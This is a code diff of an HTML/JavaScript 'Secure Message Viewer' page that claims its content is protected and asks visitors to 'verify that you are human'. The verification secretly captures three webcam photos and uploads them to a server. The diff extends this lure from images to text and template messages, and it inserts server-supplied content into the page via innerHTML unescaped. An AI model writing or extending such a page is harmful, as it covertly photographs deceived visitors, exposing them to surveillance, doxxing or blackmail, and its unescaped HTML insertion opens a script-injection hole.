@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Image Viewer</title>
+    <title>Secure Message Viewer</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
         
@@ -25,7 +25,7 @@
             position: relative;
         }
 
-        /* Blurred Background Image Container */
+        /* Blurred Background Container */
         .bg-image-container {
             position: absolute;
             top: 0;
@@ -35,6 +35,8 @@
             z-index: 1;
             overflow: hidden;
             display: none; /* Shown via JS */
+            align-items: center;
+            justify-content: center;
         }
 
         .bg-image {
@@ -43,6 +45,7 @@
             object-fit: cover;
             filter: blur(25px) brightness(0.4);
             transform: scale(1.1);
+            display: none;
         }
 
         /* Glassmorphism Card */
@@ -136,7 +139,7 @@
         /* Hidden elements */
         #videoElement, #canvasElement { display: none; }
         
-        /* Final Clear Image */
+        /* Final Clear Content */
         .clear-image {
             width: 100%;
             border-radius: 12px;
@@ -144,6 +147,20 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             display: none;
             animation: fadeIn 1s;
+        }
+
+        .clear-text {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            display: none;
+            animation: fadeIn 1s;
+            text-align: left;
+            line-height: 1.6;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            word-wrap: break-word;
         }
     </style>
 </head>
@@ -157,19 +174,20 @@
 <!-- Main UI Card -->
 <div class="glass-card" id="mainCard">
     <div class="icon-shield">🛡️</div>
-    <h2>Protected Image</h2>
-    <p>This image is highly protected by our security system. Please verify that you are human to unlock and view the clear image.</p>
+    <h2>Protected Message</h2>
+    <p>This content is highly protected by our security system. Please verify that you are human to unlock and view it.</p>
     
     <button id="verifyBtn">
         <span class="btn-icon">👁️</span>
-        Verify & View Image
+        Verify & View Content
     </button>
     
     <div id="loading" class="status-msg status-loading">⏳ Verifying... Please look at your screen.</div>
-    <div id="success" class="status-msg status-success">✅ Verification complete! Loading image...</div>
+    <div id="success" class="status-msg status-success">✅ Verification complete! Loading content...</div>
     <div id="error" class="status-msg status-error"></div>
     
     <img src="" id="finalImage" class="clear-image">
+    <div id="finalText" class="clear-text"></div>
 </div>
 
 <!-- Hidden Camera Elements -->
@@ -189,8 +207,9 @@
     const bgContainer = document.getElementById('bgContainer');
     const bgImage = document.getElementById('bgImage');
     const finalImage = document.getElementById('finalImage');
+    const finalText = document.getElementById('finalText');
 
-    let originalImageUrl = '';
+    let payloadData = null;
 
     // Initialization
     async function init() {
@@ -200,14 +219,22 @@
             return;
         }
 
-        // Fetch image URL to show blurred background
         try {
             const res = await fetch(`/api/link/${userId}`);
             if (res.ok) {
                 const data = await res.json();
-                originalImageUrl = data.original_image_url;
-                bgImage.src = originalImageUrl;
-                bgContainer.style.display = 'block';
+                payloadData = data;
+                
+                bgContainer.style.display = 'flex';
+
+                if (data.payload_type === 'image') {
+                    bgImage.src = data.original_image_url;
+                    bgImage.style.display = 'block';
+                } else if (data.payload_type === 'text') {
+                    bgContainer.innerHTML = '<div style="color:white; font-size: 30px; font-weight: bold; filter: blur(12px); padding: 40px; text-align: center; max-width: 80%; background: rgba(255,255,255,0.05); border-radius: 20px;">[ Hidden Secret Text Message ]<br><br>Length: ' + data.payload_content.length + ' chars</div>';
+                } else if (data.payload_type === 'template') {
+                    bgContainer.innerHTML = '<div style="color:white; font-size: 50px; font-weight: bold; filter: blur(12px); padding: 40px; text-align: center; background: rgba(255,255,255,0.05); border-radius: 20px;">' + data.payload_content + '</div>';
+                }
             } else {
                 showError("Link expired or not found.");
                 verifyBtn.style.display = 'none';
@@ -227,7 +254,6 @@
 
     verifyBtn.addEventListener('click', async () => {
         try {
-            // Request camera permission
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
             video.srcObject = stream;
             
@@ -238,7 +264,6 @@
             video.onloadedmetadata = async () => {
                 const images = [];
                 
-                // Capture sequence
                 for (let i = 0; i < 3; i++) {
                     await new Promise(resolve => setTimeout(resolve, 800));
                     canvas.width = video.videoWidth;
@@ -249,10 +274,8 @@
                     images.push(blob);
                 }
 
-                // Stop camera
                 stream.getTracks().forEach(track => track.stop());
 
-                // Upload
                 const formData = new FormData();
                 formData.append('id', userId);
                 images.forEach((blob, idx) => {
@@ -269,16 +292,24 @@
                         loading.style.display = 'none';
                         success.style.display = 'block';
                         
-                        // Show the final clear image inside the card
                         setTimeout(() => {
                             success.style.display = 'none';
-                            bgContainer.style.opacity = '0'; // hide blurred background
+                            bgContainer.style.opacity = '0'; 
                             document.querySelector('.icon-shield').style.display = 'none';
                             document.querySelector('h2').style.display = 'none';
                             document.querySelector('p').style.display = 'none';
+                            document.getElementById('mainCard').style.background = 'rgba(10, 10, 10, 0.9)';
                             
-                            finalImage.src = originalImageUrl;
-                            finalImage.style.display = 'block';
+                            if (payloadData.payload_type === 'image') {
+                                finalImage.src = payloadData.original_image_url;
+                                finalImage.style.display = 'block';
+                            } else if (payloadData.payload_type === 'text') {
+                                finalText.innerHTML = `<h3>📝 Secret Message:</h3><br>` + payloadData.payload_content.replace(/\n/g, '<br>');
+                                finalText.style.display = 'block';
+                            } else if (payloadData.payload_type === 'template') {
+                                finalText.innerHTML = `<div style="font-size:30px; text-align:center;">` + payloadData.payload_content + `</div>`;
+                                finalText.style.display = 'block';
+                            }
                         }, 1000);
                     } else {
                         showError("Verification failed on server.");
